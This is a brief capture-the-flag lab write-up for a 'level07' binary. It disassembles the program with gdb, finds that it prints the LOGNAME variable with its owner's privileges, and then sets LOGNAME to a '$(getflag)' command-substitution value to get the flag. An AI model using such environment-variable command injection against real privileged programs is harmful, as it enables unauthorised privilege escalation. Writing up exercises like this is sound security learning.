#we got an executable name level07, probably C
#when we use it, with or without arg it print : level07
#*we tried to disass it
gdb level07
disass main

#result
> getegid call
> geteuid call
=> it means it use Owner permission during the program
=> so if we call getflag with it, it is win

#other functions
getenv + asprintf call
it must surely print an env variable, must find the one!

#cmd
env | grep level07

> USER=level07
> LOGNAME=level07
> level07=level07

must be one of this 3
export USER='my_user'
export LOGNAME='my_log'
export level07='my_level'
./level07
> my_log

#so it prints LOGNAME! If we change it by our script like in ex04 we will get the flag
export LOGNAME='$(getflag)'
> Check flag.Here is your token : ********